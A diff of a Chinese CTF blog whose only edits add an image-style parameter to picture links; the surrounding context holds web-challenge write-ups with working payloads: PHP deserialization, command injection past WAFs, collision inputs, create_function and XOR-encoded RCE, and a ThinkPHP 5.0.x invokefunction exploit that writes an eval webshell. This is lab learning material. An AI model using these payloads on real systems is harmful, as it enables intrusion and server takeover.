@@ -79,15 +79,15 @@ foreach($classes as $clazz){
 }
 ```
 
-![image-20231204161325432](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231204161325432.png)
+![image-20231204161325432](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231204161325432.png?x-oss-process=style/blog)
 
 也就是说，用这几个类来实例化对象，返回的序列化字符串开头将为`C`。
 
-![image-20231204161421082](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231204161421082.png)
+![image-20231204161421082](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231204161421082.png?x-oss-process=style/blog)
 
 但是这么做仍然有问题。由于PHP版本的原因，高版本跑出来的序列化字符串仍然为`O`。但是自己写的类去实现serializeble接口再去序列化是没有问题的。建议用phpstorm，ide有在线低版本平台，是可以跑出来结果的。
 
-![image-20231204162158897](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231204162158897.png)
+![image-20231204162158897](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231204162158897.png?x-oss-process=style/blog)
 
 这里插句题外话，当时我没有找到合适的低版本平台，所以是照着老版本的序列化格式手搓exp的，还开了个字数统计器去数字数……
 
@@ -131,7 +131,7 @@ $str = preg_replace('/[^\W]+\((?R)?\)/', '', $this->exp);
 
 关于`__halt_compiler()`:[php文档介绍](https://www.php.net/manual/zh/function.halt-compiler.php)。
 
-![image-20231204165547944](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231204165547944.png)
+![image-20231204165547944](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231204165547944.png?x-oss-process=style/blog)
 
 这里我们用`;`隔离了两条语句上传，最后`$str`值为`;;`，不影响最后的正则匹配，因此可以进入eval语句并且成功绕过拼接符后的非法字符串。
 
@@ -141,7 +141,7 @@ $str = preg_replace('/[^\W]+\((?R)?\)/', '', $this->exp);
 
 构造exp并序列化后，传参`?exp=C:11:"ArrayObject":103:{x:i:0;a:0:{};m:a:1:{s:1:"a";O:5:"shell":1:{s:3:"exp";s:40:"print_r(scandir(current(localeconv())));";}}}`。
 
-![image-20231204170110308](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231204170110308.png)
+![image-20231204170110308](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231204170110308.png?x-oss-process=style/blog)
 
 得到敏感文件。
 
@@ -157,7 +157,7 @@ $str = preg_replace('/[^\W]+\((?R)?\)/', '', $this->exp);
 
 得到flag。
 
-![image-20231204170744618](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231204170744618.png)
+![image-20231204170744618](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20231204170744618.png?x-oss-process=style/blog)
 
 ### 参考
 
@@ -201,17 +201,17 @@ tee指令会从标准输入设备读取数据，将其内容输出到标准输�
 
 于是我们可以构造payload`http://node4.anna.nssctf.cn:28125/?url=l''s |tee 1.txt`。
 
-![image-20240221112002684](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240221112002684.png)
+![image-20240221112002684](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240221112002684.png?x-oss-process=style/blog)
 
 可以看到这里我们利用了`''`绕过了WAF，并且将内容输出到了1.txt文件。此时我们切换到`http://node4.anna.nssctf.cn:28125/1.txt`去查看文件。
 
-![image-20240221112235705](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240221112235705.png)
+![image-20240221112235705](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240221112235705.png?x-oss-process=style/blog)
 
 写入成功，接下来我们就可以慢慢穿越目录找flag了。
 
 最后使用exp`http://node4.anna.nssctf.cn:28125/?url=tac /flllll\aaaaaaggggggg|tee 1.txt`结束战斗。
 
-![image-20240221112633338](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240221112633338.png)
+![image-20240221112633338](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240221112633338.png?x-oss-process=style/blog)
 
 得到flag`NSSCTF{64645b91-933c-49ca-9a67-d54a6a253297}`。
 
@@ -226,13 +226,13 @@ tee指令会从标准输入设备读取数据，将其内容输出到标准输�
 
 首先进入环境。
 
-![image-20240222181611748](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222181611748.png)
+![image-20240222181611748](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222181611748.png?x-oss-process=style/blog)
 
 noting here.
 
 这肯定不对啊，打开源代码看看。
 
-![image-20240222181741758](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222181741758.png)
+![image-20240222181741758](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222181741758.png?x-oss-process=style/blog)
 
 我靠这就是level1，赶紧套个小标题压压惊。
 
@@ -240,13 +240,13 @@ noting here.
 
 那么正式开始分析，这里的源代码`<!-- disallow: -->`暗示我们可能有源码泄露，于是我们访问一下`/robots.txt`。
 
-![image-20240222181924043](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222181924043.png)
+![image-20240222181924043](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222181924043.png?x-oss-process=style/blog)
 
 果然，于是我们访问`/level_2_1s_h3re.php`，移动到level2。
 
 ### level2
 
-![image-20240222182016334](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222182016334.png)
+![image-20240222182016334](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222182016334.png?x-oss-process=style/blog)
 
 一眼望过去又是PHP中的md5碰撞，不过这里是强碰撞，且进行了字符化处理，也就是说0e碰撞和数组绕过的特性失效了。看来是真的要输入两个碰撞的md5值，没什么好说的，上网查资料，果然有现成的exp，放在这里备用。
 
@@ -256,7 +256,7 @@ array1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%
 
 一顿操作后得到level3的路径。
 
-![image-20240222183112065](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222183112065.png)
+![image-20240222183112065](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222183112065.png?x-oss-process=style/blog)
 
 访问`/Level___3.php`以移动到level3。
 
@@ -264,7 +264,7 @@ tips：最好使用burpsuite抓包发送，我用hackbar发送总是过不去，
 
 ### level3
 
-![image-20240222183219619](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222183219619.png)
+![image-20240222183219619](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222183219619.png?x-oss-process=style/blog)
 
 同样的结构，只不过这次要求sha1碰撞，上网查exp，直接过。
 
@@ -272,13 +272,13 @@ tips：最好使用burpsuite抓包发送，我用hackbar发送总是过不去，
 array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&array2=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1
 ```
 
-![image-20240222183521462](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222183521462.png)
+![image-20240222183521462](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222183521462.png?x-oss-process=style/blog)
 
 成功得到level4路径，访问`/level_level_4.php`移动到level4。
 
 ### level4
 
-![image-20240222183701902](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222183701902.png)
+![image-20240222183701902](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222183701902.png?x-oss-process=style/blog)
 
 这题有点意思。
 
@@ -286,13 +286,13 @@ array1=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%2
 
 这里就要说到一个特性，PHP会将请求参数中的非法字符替换为下划线，这里用`+`绕过，构造exp`/?NI+SA+=txw4ever`，可以得到level5的路径。
 
-![image-20240222184653073](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222184653073.png)
+![image-20240222184653073](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222184653073.png?x-oss-process=style/blog)
 
 根据`55_5_55.php`移动到level5。
 
 ### level5
 
-![image-20240222184740573](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222184740573.png)
+![image-20240222184740573](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222184740573.png?x-oss-process=style/blog)
 
 终于进入正题，来到RCE环节。注意到`$a('',$b);`，考虑使用`create_function()`来进行RCE。
 
@@ -324,7 +324,7 @@ phpinfo();/*
 
 同理，在这里我们也可以利用`create_function()`命令执行。令`$a=create_function`，`$b=};system('tac /f*');/*`构造exp。又因为存在WAF对`$a`的第一个字符进行过滤，捕捉任何字母和数字，所以我们还需要利用反斜杠进行绕过，即`$a=\create_funtion`。
 
-![image-20240222190652192](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222190652192.png)
+![image-20240222190652192](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222190652192.png?x-oss-process=style/blog)
 
 得到flag，收工。
 
@@ -338,7 +338,7 @@ phpinfo();/*
 
 容器，启动！
 
-![image-20240222193409390](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222193409390.png)
+![image-20240222193409390](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222193409390.png?x-oss-process=style/blog)
 
 flag在哪里呢？
 
@@ -346,7 +346,7 @@ flag在哪里呢？
 
 老规矩，看源码。但是源码也没有找到信息，那就只能老老实实开dirsearch扫描了。扫描过程中发现有`/.git/HEAD`等文件，猜测存在git泄露，用githack工具扫一遍，果然抓到了泄露的git包。
 
-![image-20240222193643988](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222193643988.png)
+![image-20240222193643988](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222193643988.png?x-oss-process=style/blog)
 
 flag.php里没什么有用的信息，重要的是我们得到了index.php的源码。
 
@@ -383,7 +383,7 @@ if(isset($_GET['exp'])){
 
 这道题和[湖南省网络攻防邀请大赛ezrce](#湖南省网络攻防邀请大赛ezrce)有异曲同工之妙，我们可以直接套它的exp`highlight_file(next(array_reverse(scandir(current(localeconv())))));`。
 
-![image-20240222194901564](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222194901564.png)
+![image-20240222194901564](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240222194901564.png?x-oss-process=style/blog)
 
 果不其然直接就出了。
 
@@ -397,21 +397,21 @@ if(isset($_GET['exp'])){
 
 进入容器。
 
-![image-20240223194303034](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240223194303034.png)
+![image-20240223194303034](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240223194303034.png?x-oss-process=style/blog)
 
 真的什么都没有吗？（为什么RCE老喜欢藏着掖着）
 
 看看源代码，一无所获。再看看robots.txt？果不其然，出现了提示。
 
-![image-20240223195000028](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240223195000028.png)
+![image-20240223195000028](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240223195000028.png?x-oss-process=style/blog)
 
 于是我们访问`/NSS/index.php/`。
 
-<img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240223195046009.png" alt="image-20240223195046009" style="zoom:67%;" />
+<img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240223195046009.png?x-oss-process=style/blog" alt="image-20240223195046009" style="zoom:67%;" />
 
 BOOM！是ThinkPHP，赶紧随便访问个目录报错看看版本。
 
-<img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240223195215386.png" alt="image-20240223195215386" style="zoom:67%;" />
+<img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240223195215386.png?x-oss-process=style/blog" alt="image-20240223195215386" style="zoom:67%;" />
 
 重点来了，题目环境的ThinkPHP框架版本为V5.0.22，而在版本5.0.0<=5.0.23、5.1.0<=5.1.30中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。
 
@@ -421,13 +421,13 @@ BOOM！是ThinkPHP，赶紧随便访问个目录报错看看版本。
 
    `/index.php?s=index/\think\app/invokefunction&function=phpinfo&vars[0]=100`
 
-   <img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240223201242477.png" alt="image-20240223201242477" style="zoom: 50%;" />
+   <img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240223201242477.png?x-oss-process=style/blog" alt="image-20240223201242477" style="zoom: 50%;" />
 
 2. 执行系统命令：
 
    `/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami`
 
-   <img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240223201313443.png" alt="image-20240223201313443" style="zoom:50%;" />
+   <img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240223201313443.png?x-oss-process=style/blog" alt="image-20240223201313443" style="zoom:50%;" />
 
 3. 写入`webshell`:
 
@@ -437,13 +437,13 @@ BOOM！是ThinkPHP，赶紧随便访问个目录报错看看版本。
 
    `%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%47%45%54%5b%27%73%68%65%6c%6c%27%5d%29%3b%20%3f%3e`。
 
-   <img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240223201659922.png" alt="image-20240223201659922" style="zoom: 50%;" />
+   <img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240223201659922.png?x-oss-process=style/blog" alt="image-20240223201659922" style="zoom: 50%;" />
 
    可以看到写入成功了，页面回显了数字31。
 
 4. 切换到webshell文件`/shell.php`，用蚁剑连接或者直接命令执行。
 
-   <img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240223202200614.png" alt="image-20240223202200614" style="zoom:50%;" />
+   <img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240223202200614.png?x-oss-process=style/blog" alt="image-20240223202200614" style="zoom:50%;" />
 
    
 
@@ -459,7 +459,7 @@ BOOM！是ThinkPHP，赶紧随便访问个目录报错看看版本。
 
 进入容器
 
-![image-20240226095322389](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240226095322389.png)
+![image-20240226095322389](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240226095322389.png?x-oss-process=style/blog)
 
 进行审计，发现这里主要有两层WAF，一个是出现在题目中的正则表达式，还有一个是隐藏在`check.php`的`checkdata()`函数。
 
@@ -476,11 +476,11 @@ res = requests.post("http://1.14.71.254:28939/", data={"letter":payload})
 print(res.text)
 ```
 
-![image-20240226100309756](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240226100309756.png)
+![image-20240226100309756](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240226100309756.png?x-oss-process=style/blog)
 
 顺带一提，还可以利用这个脚本查看`check.php`，可以看到这里过滤了大多数函数。
 
-![image-20240226100407275](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240226100407275.png)
+![image-20240226100407275](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240226100407275.png?x-oss-process=style/blog)
 
 ### 参考
 
@@ -492,7 +492,7 @@ print(res.text)
 
 进入题目。
 
-![image-20240226170028085](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240226170028085.png)
+![image-20240226170028085](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240226170028085.png?x-oss-process=style/blog)
 
 十分的短小精悍，正则也是基本过滤了所有的字母，同样是无字母RCE，可以用异或或者取反的方法上传payload。
 
@@ -637,7 +637,7 @@ mess=$_=("!"^"@").("-"^"^").("-"^"^").("%"^"@").("/" ^ "]").("/"^"[");$__ = ('{'
 
 执行代码，回显`phpinfo()`页面，查找得flag`NSSCTF{5d6e9815-af9a-442f-8165-2a99598ddc36}`。
 
-![image-20240226171106149](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240226171106149.png)
+![image-20240226171106149](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240226171106149.png?x-oss-process=style/blog)
 
 ### 参考
 
@@ -647,4 +647,4 @@ mess=$_=("!"^"@").("-"^"^").("-"^"^").("%"^"@").("/" ^ "]").("/"^"[");$__ = ('{'
 
 （分割线~）
 
-![c74d52864acadc32631ab8b75a6cb15](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/c74d52864acadc32631ab8b75a6cb15.jpg)
+![c74d52864acadc32631ab8b75a6cb15](https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/c74d52864acadc32631ab8b75a6cb15.jpg?x-oss-process=style/blog)
